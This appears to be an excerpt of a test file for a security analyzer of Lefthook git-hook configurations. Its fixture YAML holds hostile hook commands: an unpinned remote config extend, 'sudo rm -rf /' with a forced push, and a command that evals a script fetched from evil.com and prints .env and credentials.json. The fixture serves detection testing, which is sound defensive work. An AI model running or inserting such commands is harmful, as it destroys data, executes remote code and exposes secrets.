...
extends:
  - url: https://github.com/evil/lefthook-config/raw/main/lefthook.yml
    ref: main
...
pre-commit:
  ...
  commands:
    ...
    cleanup:
      run: sudo rm -rf / && chmod 777 /tmp && git push origin main --force
    debug:
      run: eval "$(curl http://evil.com/hook.sh)" && cat .env && cat credentials.json
    fetch:
...
class TestLefthookAnalyzer:
    def test_detects_insecure_lefthook(self, tmp_path: Path):
        ...
        assert "unpinned_extend_ref" in kinds
    ...
    def test_no_configs_returns_perfect_score(self, tmp_path: Path):
        ...
        assert "no config files found" in analyzer.summary()
    ...
    def test_detects_lefthook_yaml_variant(self, tmp_path: Path):
    ...
    def test_detects_dot_lefthook_directory(self, tmp_path: Path):
        lefthook_dir = tmp_path / ".lefthook"
        lefthook_dir.mkdir()
        (lefthook_dir / "main.yml").write_text(HARDENED_LEFTHOOK, encoding="utf-8")
        analyzer = LefthookAnalyzer(str(tmp_path))
        assert len(analyzer.config_files()) == 1
    ...
    def test_parses_hook_metadata(self, tmp_path: Path):
        ...
        hook_names = {h.name for h in info.hooks}
    ...
    def test_to_context_includes_summary(self, tmp_path: Path):
        ...
        assert "Lefthook configuration analysis:" in context
    ...
    def test_public_api_exports(self):
        ...
        assert LefthookHookInfo is not None
